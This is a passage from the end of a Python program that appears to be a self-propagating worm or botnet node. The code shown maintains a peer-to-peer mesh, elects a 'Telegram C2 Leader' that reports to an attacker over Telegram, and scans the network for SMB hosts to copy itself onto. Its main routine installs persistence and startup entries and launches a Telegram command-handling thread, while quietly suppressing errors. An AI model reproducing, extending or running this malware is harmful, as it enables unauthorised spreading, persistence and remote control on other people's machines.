        for peer_ip in peers_to_check_set:
            if not is_target_ip(peer_ip): continue
            is_alive, reported_hostname = check_peer_alive(peer_ip)
            now = time.time()
            with peers_info_lock:
                if is_alive:
                    current_info = known_peers_info.get(peer_ip)
                    new_info = {"hostname": reported_hostname, "last_seen": now}
                    current_alive_target_peers[peer_ip] = new_info
                    if current_info != new_info:
                        known_peers_info[peer_ip] = new_info; info_updated = True

        sorted_alive_ips = sorted(current_alive_target_peers.keys())
        new_leader_status = False
        if sorted_alive_ips:
            elected_leader_ip = sorted_alive_ips[0]
            new_leader_status = (elected_leader_ip == my_ip)

        with leader_status_lock:
            if is_telegram_leader != new_leader_status:
                is_telegram_leader = new_leader_status
                if is_telegram_leader:
                    send_telegram_message(f"👑 Node `{my_hostname}` (`{my_ip}`) is now the Telegram C2 Leader.")

        if start_time - last_gossip_time > GOSSIP_INTERVAL:
            gossip_candidates: List[str] = []
            with peers_info_lock:
                gossip_candidates = [p for p in known_peer_ips if p != my_ip and is_target_ip(p)]

            if gossip_candidates:
                target_peer_for_gossip = random.choice(gossip_candidates)
                received_peers_set = request_peers_from(target_peer_for_gossip)
                if received_peers_set:
                    with peers_info_lock:
                        valid_new_peers = {p for p in received_peers_set if is_target_ip(p) and p != my_ip and p not in known_peer_ips}
                        if valid_new_peers:
                            known_peer_ips.update(valid_new_peers); peers_changed = True
                            for ip_new in valid_new_peers: # Renamed ip to ip_new to avoid conflict
                                if ip_new not in known_peers_info:
                                    known_peers_info[ip_new] = {"hostname": None, "last_seen": 0}; info_updated = True
            last_gossip_time = start_time

        potential_smb_hosts: List[str] = []
        if start_time - last_smb_scan_time > GOSSIP_INTERVAL * 2:
             potential_smb_hosts = scan_network_for_smb()
             last_smb_scan_time = start_time
             if potential_smb_hosts:
                 with peers_info_lock: current_known_ips_copy = known_peer_ips.copy()
                 hosts_to_try_spreading_set = set(potential_smb_hosts) - current_known_ips_copy - {my_ip}
                 if hosts_to_try_spreading_set:
                     for target_ip_spread in hosts_to_try_spreading_set: # Renamed target_ip to avoid conflict
                         if is_target_ip(target_ip_spread): copy_to_host(target_ip_spread); time.sleep(0.2)

        current_time_for_cleanup = time.time()
        with peers_info_lock:
            stale_threshold = PEER_INFO_TIMEOUT * 5
            stale_peers_to_remove_info = [
                ip_stale for ip_stale, info in known_peers_info.items() # Renamed ip to ip_stale
                if ip_stale != my_ip and current_time_for_cleanup - info.get("last_seen", 0) > stale_threshold
            ]
            if stale_peers_to_remove_info:
                for ip_rem in stale_peers_to_remove_info: # Renamed ip to ip_rem
                    if ip_rem in known_peers_info: del known_peers_info[ip_rem]; info_updated = True
                    if ip_rem in known_peer_ips: known_peer_ips.remove(ip_rem); peers_changed = True

        save_interval = 120 if peers_changed else 600
        if peers_changed or (start_time - last_peer_save_time > save_interval):
            save_peer_list_ips(); last_peer_save_time = start_time

        end_time = time.time(); elapsed_time = end_time - start_time
        sleep_duration = max(1.0, COORDINATION_INTERVAL - elapsed_time)
        time.sleep(sleep_duration)


# --- Main Execution ---
def main():
    """Main entry point: Sets up persistence, starts background threads."""
    my_ip = get_self_ip_address() 

    try:
        is_persisted = persist_in_system()
        if is_persisted:
            add_to_startup()
    except Exception: pass 

    register_node_telegram() 

    threads: List[threading.Thread] = []
    server_thread = threading.Thread(target=peer_server_loop, name="P2PServerThread", daemon=True)
    threads.append(server_thread)
    coord_thread = threading.Thread(target=coordination_loop, name="CoordinationThread", daemon=True)
    threads.append(coord_thread)
    telegram_thread = threading.Thread(target=handle_telegram_commands, name="TelegramHandlerThread", daemon=True)
    threads.append(telegram_thread)

    for t in threads: t.start()

    while True:
        try:
            all_alive = all(t.is_alive() for t in threads)
            if not all_alive:
                 for t in threads:
                     if not t.is_alive():
                         try:
                             send_telegram_message(f"🆘 *CRITICAL ERROR*\nNode `{get_self_ip_address()}`: Thread `{t.name}` died. Node shutting down.")
                         except Exception: pass 
                 break 
            time.sleep(60)
        except KeyboardInterrupt:
            break
        except Exception:
            time.sleep(60) 

if __name__ == "__main__":
    try:
        script_path = get_script_path()
        script_dir = os.path.dirname(script_path)
        if script_dir and os.path.isdir(script_dir):
             os.chdir(script_dir)
    except Exception: pass 

    main()
